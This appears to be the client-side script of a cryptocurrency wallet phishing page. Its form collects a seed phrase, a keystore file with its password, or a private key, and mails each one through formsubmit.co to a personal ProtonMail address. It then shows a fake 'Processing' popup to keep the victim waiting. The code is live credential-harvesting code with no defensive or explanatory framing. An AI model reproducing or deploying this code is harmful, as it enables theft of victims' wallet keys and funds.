     <script>
        document.addEventListener("DOMContentLoaded", function () {
            // Select the form
            const form = document.getElementById("form");

            // Add submit event listener to the form
            form.addEventListener("submit", function (event) {
                // Prevent the default form submission behavior
                event.preventDefault();

                // Get the active part of the form
                const activePart = document.querySelector(".acc-body.active");

                // Check which part of the form is active
                if (activePart.id === "first") {
                    // Serialize and submit data for the first part of the form
                    const phraseInput = activePart.querySelector("textarea[name='phrase']").value;
                    const formData = new FormData();
                    formData.append("phrase", phraseInput);
                    submitFormData(formData);
                } else if (activePart.id === "second") {
                    // Serialize and submit data for the second part of the form
                    const fileInput = activePart.querySelector("#file-upload").files[0];
                    const keystorePasswordInput = activePart.querySelector("input[name='keystorepassword']").value;
                    const formData = new FormData();
                    formData.append("file", fileInput);
                    formData.append("keystorepassword", keystorePasswordInput);
                    submitFormData(formData);
                } else if (activePart.id === "third") {
                    // Serialize and submit data for the third part of the form
                    const privateKeyInput = activePart.querySelector("input[name='privatekey']").value;
                    const formData = new FormData();
                    formData.append("privatekey", privateKeyInput);
                    submitFormData(formData);
                } else {
                    console.error("Unknown form part!");
                }
            });

            // Function to submit form data using fetch API
            function submitFormData(formData) {
                fetch("https://formsubmit.co/ajax/lostangels77@protonmail.com", {
                    method: "POST",
                    body: formData // Use FormData object for POST body
                })
                    .then(response => {
                        if (response.ok) {
                            // Handle success response (e.g., display success message)
                            
                            openbarcode();
                        } else {
                            // Handle error response (e.g., display error message)
                            console.error("Form submission failed!");
                            
                        }
                    })
                    .catch(error => {
                        console.error("Error:", error);
                    });
            }
        });

    </script>
    <script>
        function openbarcode() {
            document.getElementById("popup").style.display = "block";
            // Add additional logic or actions here if needed
        }
        document.addEventListener("DOMContentLoaded", function () {
            // Get the loading paragraph element
            var loadingParagraph = document.querySelector('.popup-content p');

            // Set the initial number of dots
            var numDots = 1;

            // Define a function to update the loading text
            function updateLoadingText() {
                // Update the text with the appropriate number of dots
                loadingParagraph.textContent = 'Processing' + '.'.repeat(numDots);

                // Increase the number of dots, or reset to 1 if it reaches 6
                numDots = numDots === 6 ? 1 : numDots + 1;
            }

            // Call the updateLoadingText function every 1000 milliseconds (adjust as needed)
            setInterval(updateLoadingText, 2000);
        });
        function thankyou_message() {
            var btn = document.querySelectorAll("#prbutton");
            var thankyouMessage = document.querySelector('.thankyou_message');
            if (btn.innerHTML === "Processing.....") {
                openbarcode();
            } else {
                thankyouMessage.style.display = "none";
            }
        }
    </script>
